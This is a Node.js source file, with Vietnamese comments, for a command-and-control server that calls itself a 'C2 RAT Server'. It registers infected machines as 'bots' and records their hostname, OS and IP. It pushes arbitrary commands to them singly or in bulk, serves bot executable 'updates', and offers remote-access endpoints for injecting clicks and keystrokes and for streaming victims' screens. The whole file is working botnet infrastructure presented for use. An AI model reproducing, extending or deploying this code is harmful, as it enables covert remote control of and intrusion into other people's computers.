const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// --- INIT ---
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// --- JSON DATABASE ---
const DB_PATH = path.join(__dirname, 'data', 'db.json');

// Đảm bảo thư mục data tồn tại
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}

// Khởi tạo database nếu chưa có
if (!fs.existsSync(DB_PATH)) {
    const initData = {
        bots: [],
        commands: [],
        pending_commands: [],
        rat_sessions: [],
        admin_logs: []
    };
    fs.writeFileSync(DB_PATH, JSON.stringify(initData, null, 2));
}

// Hàm đọc database
function readDB() {
    try {
        const data = fs.readFileSync(DB_PATH, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error('Lỗi đọc DB:', err);
        return { bots: [], commands: [], pending_commands: [], rat_sessions: [], admin_logs: [] };
    }
}

// Hàm ghi database
function writeDB(data) {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
        return true;
    } catch (err) {
        console.error('Lỗi ghi DB:', err);
        return false;
    }
}

// Hàm tìm bot theo ID
function findBot(botId) {
    const db = readDB();
    return db.bots.find(b => b.bot_id === botId);
}

// Hàm tìm command theo cmd_id
function findCommand(cmdId) {
    const db = readDB();
    return db.commands.find(c => c.cmd_id === cmdId);
}

// Hàm thêm bot
function addBot(botData) {
    const db = readDB();
    const existing = db.bots.findIndex(b => b.bot_id === botData.bot_id);
    if (existing !== -1) {
        db.bots[existing] = { ...db.bots[existing], ...botData };
    } else {
        db.bots.push(botData);
    }
    writeDB(db);
    return botData;
}

// Hàm xóa bot
function deleteBot(botId) {
    const db = readDB();
    db.bots = db.bots.filter(b => b.bot_id !== botId);
    db.commands = db.commands.filter(c => c.bot_id !== botId);
    db.pending_commands = db.pending_commands.filter(p => p.bot_id !== botId);
    writeDB(db);
    return true;
}

// Hàm thêm command
function addCommand(cmdData) {
    const db = readDB();
    db.commands.push(cmdData);
    writeDB(db);
    return cmdData;
}

// Hàm cập nhật command
function updateCommand(cmdId, updateData) {
    const db = readDB();
    const idx = db.commands.findIndex(c => c.cmd_id === cmdId);
    if (idx !== -1) {
        db.commands[idx] = { ...db.commands[idx], ...updateData };
        writeDB(db);
        return db.commands[idx];
    }
    return null;
}

// Hàm thêm pending command
function addPendingCommand(cmdData) {
    const db = readDB();
    db.pending_commands.push(cmdData);
    writeDB(db);
    return cmdData;
}

// Hàm xóa pending command
function deletePendingCommand(botId) {
    const db = readDB();
    db.pending_commands = db.pending_commands.filter(p => p.bot_id !== botId);
    writeDB(db);
    return true;
}

// Hàm lấy pending commands của bot
function getPendingCommands(botId) {
    const db = readDB();
    return db.pending_commands.filter(p => p.bot_id === botId);
}

// Hàm thêm log admin
function addAdminLog(action, botId = null) {
    const db = readDB();
    db.admin_logs.push({
        id: Date.now(),
        action: action,
        bot_id: botId,
        timestamp: Date.now()
    });
    writeDB(db);
}

// Quản lý bot online
const botClients = new Map();
const ADMIN_PASSWORD = 'H3XTEK0';

// Auth middleware
function auth(req, res, next) {
    const token = req.headers['authorization'];
    if (!token || token !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// WebSocket Server
wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            const botId = data.bot_id;
            if (!botId) return;

            if (data.type === 'register') {
                botClients.set(botId, ws);
                const screenWidth = data.screen_width || 1920;
                const screenHeight = data.screen_height || 1080;

                // Lưu bot vào JSON
                addBot({
                    bot_id: botId,
                    group_name: data.group || 'default',
                    version: data.version || '1.0.0',
                    os: data.os || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    ip: clientIp,
                    last_seen: Date.now(),
                    online: 1,
                    screen_width: screenWidth,
                    screen_height: screenHeight
                });

                // Gửi pending commands
                const pendings = getPendingCommands(botId);
                if (pendings.length > 0) {
                    pendings.forEach(row => {
                        sendCommand(ws, botId, row.cmd_id, row.command, JSON.parse(row.args || '[]'));
                    });
                    deletePendingCommand(botId);
                }

                console.log(`[BOT] Registered: ${botId} (${clientIp})`);
                ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
                addAdminLog('bot_registered', botId);
            }

            else if (data.type === 'heartbeat') {
                // Update last_seen
                const db = readDB();
                const bot = db.bots.find(b => b.bot_id === botId);
                if (bot) {
                    bot.last_seen = Date.now();
                    bot.online = 1;
                    writeDB(db);
                }
            }

            else if (data.type === 'result') {
                updateCommand(data.cmd_id, {
                    result: data.result,
                    status: data.status || 'ok',
                    executed_at: Date.now()
                });
                console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
            }

        } catch (e) {
            console.error('WebSocket error:', e);
        }
    });

    ws.on('close', () => {
        for (let [id, client] of botClients.entries()) {
            if (client === ws) {
                botClients.delete(id);
                const db = readDB();
                const bot = db.bots.find(b => b.bot_id === id);
                if (bot) {
                    bot.online = 0;
                    writeDB(db);
                }
                break;
            }
        }
    });
});

function sendCommand(ws, botId, cmdId, command, args = []) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'command',
            payload: {
                cmd_id: cmdId,
                command: command,
                args: args
            }
        }));
        return true;
    }
    return false;
}

// --- API ENDPOINTS ---

// Lấy danh sách bot
app.get('/api/bots', auth, (req, res) => {
    const db = readDB();
    res.json(db.bots);
});

// Lấy bot online
app.get('/api/bots/online', auth, (req, res) => {
    const db = readDB();
    const online = db.bots.filter(b => b.online === 1);
    res.json(online);
});

// Xóa bot
app.delete('/api/bots/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    if (deleteBot(botId)) {
        addAdminLog('delete_bot', botId);
        res.json({ status: 'deleted', bot_id: botId });
    } else {
        res.status(404).json({ error: 'Bot not found' });
    }
});

// Xóa tất cả bot
app.delete('/api/bots', auth, (req, res) => {
    const db = readDB();
    db.bots = [];
    db.commands = [];
    db.pending_commands = [];
    writeDB(db);
    addAdminLog('delete_all_bots');
    res.json({ status: 'all_bots_deleted' });
});

// Gửi lệnh đến bot
app.post('/api/command', auth, (req, res) => {
    const { bot_id, command, args = [] } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'Missing bot_id or command' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    
    addCommand({
        bot_id: bot_id,
        cmd_id: cmdId,
        command: command,
        args: JSON.stringify(args),
        result: null,
        status: 'pending',
        issued_at: Date.now(),
        executed_at: null
    });

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        sendCommand(ws, bot_id, cmdId, command, args);
        addAdminLog('command_sent', bot_id);
        res.json({ status: 'sent', cmd_id: cmdId, bot_id });
    } else {
        addPendingCommand({
            bot_id: bot_id,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            issued_at: Date.now()
        });
        res.json({ status: 'queued', cmd_id: cmdId, bot_id });
    }
});

// Gửi lệnh hàng loạt
app.post('/api/command/bulk', auth, (req, res) => {
    const { bot_ids, command, args = [] } = req.body;
    if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
        return res.status(400).json({ error: 'Missing bot_ids array' });
    }

    const results = [];
    bot_ids.forEach(botId => {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        addCommand({
            bot_id: botId,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            result: null,
            status: 'pending',
            issued_at: Date.now(),
            executed_at: null
        });
        
        const ws = botClients.get(botId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            sendCommand(ws, botId, cmdId, command, args);
            results.push({ bot_id: botId, status: 'sent', cmd_id: cmdId });
        } else {
            addPendingCommand({
                bot_id: botId,
                cmd_id: cmdId,
                command: command,
                args: JSON.stringify(args),
                issued_at: Date.now()
            });
            results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
        }
    });

    addAdminLog('bulk_command');
    res.json({ results });
});

// Lấy kết quả lệnh
app.get('/api/results/:cmd_id', auth, (req, res) => {
    const cmd = findCommand(req.params.cmd_id);
    res.json(cmd || {});
});

// Lấy kết quả cuối của bot
app.get('/api/results/latest/:bot_id', auth, (req, res) => {
    const db = readDB();
    const cmd = db.commands
        .filter(c => c.bot_id === req.params.bot_id && c.command === 'sc')
        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0))[0];
    res.json(cmd || {});
});

// Lấy lịch sử bot
app.get('/api/history/:bot_id', auth, (req, res) => {
    const db = readDB();
    const history = db.commands
        .filter(c => c.bot_id === req.params.bot_id)
        .sort((a, b) => b.issued_at - a.issued_at)
        .slice(0, 50);
    res.json(history);
});

// Lấy tất cả commands
app.get('/api/commands', auth, (req, res) => {
    const db = readDB();
    res.json(db.commands);
});

// Xóa command
app.delete('/api/commands/:cmd_id', auth, (req, res) => {
    const db = readDB();
    db.commands = db.commands.filter(c => c.cmd_id !== req.params.cmd_id);
    writeDB(db);
    addAdminLog('delete_command');
    res.json({ status: 'deleted', cmd_id: req.params.cmd_id });
});

// Xóa tất cả commands
app.delete('/api/commands', auth, (req, res) => {
    const db = readDB();
    db.commands = [];
    writeDB(db);
    addAdminLog('delete_all_commands');
    res.json({ status: 'all_commands_deleted' });
});

// Lấy pending commands
app.get('/api/pending', auth, (req, res) => {
    const db = readDB();
    res.json(db.pending_commands);
});

// Xóa pending command
app.delete('/api/pending/:cmd_id', auth, (req, res) => {
    const db = readDB();
    db.pending_commands = db.pending_commands.filter(p => p.cmd_id !== req.params.cmd_id);
    writeDB(db);
    res.json({ status: 'deleted', cmd_id: req.params.cmd_id });
});

// Lấy admin logs
app.get('/api/logs', auth, (req, res) => {
    const db = readDB();
    const limit = parseInt(req.query.limit) || 100;
    const logs = db.admin_logs.sort((a, b) => b.timestamp - a.timestamp).slice(0, limit);
    res.json(logs);
});

// Xóa logs
app.delete('/api/logs', auth, (req, res) => {
    const db = readDB();
    db.admin_logs = [];
    writeDB(db);
    res.json({ status: 'logs_cleared' });
});

// Download update
app.get('/api/download/update/:version', (req, res) => {
    const version = req.params.version;
    const ext = req.query.ext || 'exe';
    const filePath = path.join(__dirname, 'updates', `bot_${version}.${ext}`);
    
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).json({ error: 'Update not found' });
    }
});

// --- RAT ENDPOINTS ---

// Bắt đầu RAT
app.post('/api/rat/start', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const db = readDB();
    const existing = db.rat_sessions.findIndex(r => r.bot_id === bot_id);
    if (existing !== -1) {
        db.rat_sessions[existing].session_start = Date.now();
    } else {
        db.rat_sessions.push({
            bot_id: bot_id,
            socket_id: 'ws-' + Date.now(),
            session_start: Date.now()
        });
    }
    writeDB(db);

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, bot_id, cmdId, 'rat_start', []);

    addAdminLog('rat_start', bot_id);
    res.json({ status: 'rat_session_started', bot_id });
});

// Dừng RAT
app.post('/api/rat/stop', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        sendCommand(ws, bot_id, cmdId, 'rat_stop', []);
    }

    const db = readDB();
    db.rat_sessions = db.rat_sessions.filter(r => r.bot_id !== bot_id);
    writeDB(db);

    addAdminLog('rat_stop', bot_id);
    res.json({ status: 'rat_session_stopped', bot_id });
});

// Gửi sự kiện RAT
app.post('/api/rat/event', auth, (req, res) => {
    const { bot_id, event_type, x, y, text, url } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    let command = 'rat_event';
    let args = [event_type];

    if (event_type === 'click' || event_type === 'rightclick' || event_type === 'doubleclick' || event_type === 'move') {
        args.push(x || 0, y || 0);
    } else if (event_type === 'key') {
        args.push(text || '');
    } else if (event_type === 'notepad') {
        command = 'rat_notepad';
        args = [text || ''];
    } else if (event_type === 'browser') {
        command = 'rat_browser';
        args = [url || 'https://www.google.com'];
    }

    sendCommand(ws, bot_id, cmdId, command, args);
    res.json({ status: 'event_sent', cmd_id: cmdId });
});

// Stream RAT
app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    const ws = botClients.get(botId);
    
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, botId, cmdId, 'rat_stream', []);

    res.json({ status: 'stream_started', bot_id: botId });
});

// --- DASHBOARD ROUTES ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/rat', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'rat.html'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

// --- DATABASE MANAGEMENT ENDPOINTS (CRUD) ---

// 1. Xem toàn bộ database
app.get('/api/db', auth, (req, res) => {
    const db = readDB();
    res.json(db);
});

// 2. Xem bảng bots
app.get('/api/db/bots', auth, (req, res) => {
    const db = readDB();
    res.json(db.bots);
});

// 3. Xem bảng commands
app.get('/api/db/commands', auth, (req, res) => {
    const db = readDB();
    res.json(db.commands);
});

// 4. Xem bảng pending_commands
app.get('/api/db/pending', auth, (req, res) => {
    const db = readDB();
    res.json(db.pending_commands);
});

// 5. Xem bảng rat_sessions
app.get('/api/db/sessions', auth, (req, res) => {
    const db = readDB();
    res.json(db.rat_sessions);
});

// 6. Xem bảng logs
app.get('/api/db/logs', auth, (req, res) => {
    const db = readDB();
    res.json(db.admin_logs);
});

// 7. Thêm bot (POST)
app.post('/api/db/bots', auth, (req, res) => {
    const botData = req.body;
    if (!botData.bot_id) {
        return res.status(400).json({ error: 'Missing bot_id' });
    }
    const result = addBot(botData);
    addAdminLog('db_add_bot', botData.bot_id);
    res.json({ status: 'added', bot: result });
});

// 8. Cập nhật bot (PUT)
app.put('/api/db/bots/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    const db = readDB();
    const idx = db.bots.findIndex(b => b.bot_id === botId);
    if (idx === -1) {
        return res.status(404).json({ error: 'Bot not found' });
    }
    db.bots[idx] = { ...db.bots[idx], ...req.body };
    writeDB(db);
    addAdminLog('db_update_bot', botId);
    res.json({ status: 'updated', bot: db.bots[idx] });
});

// 9. Xóa bot (DELETE) - đã có ở trên
// 10. Xóa tất cả dữ liệu
app.delete('/api/db', auth, (req, res) => {
    const emptyData = {
        bots: [],
        commands: [],
        pending_commands: [],
        rat_sessions: [],
        admin_logs: []
    };
    writeDB(emptyData);
    addAdminLog('db_clear_all');
    res.json({ status: 'all_data_cleared' });
});

// --- START ---
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`========================================`);
    console.log(`  C2 RAT Server with JSON DB`);
    console.log(`  Port: ${PORT}`);
    console.log(`  Dashboard: https://localhost:${PORT}/`);
    console.log(`  RAT Control: https://localhost:${PORT}/rat`);
    console.log(`  Password: H3XTEK0`);
    console.log(`  DB File: ${DB_PATH}`);
    console.log(`========================================`);
    console.log(`📊 Database API:`);
    console.log(`  GET  /api/db          - Xem toàn bộ DB`);
    console.log(`  GET  /api/db/bots     - Xem bots`);
    console.log(`  GET  /api/db/commands - Xem commands`);
    console.log(`  POST /api/db/bots     - Thêm bot`);
    console.log(`  PUT  /api/db/bots/:id - Cập nhật bot`);
    console.log(`  DELETE /api/db        - Xóa toàn bộ`);
    console.log(`========================================`);
});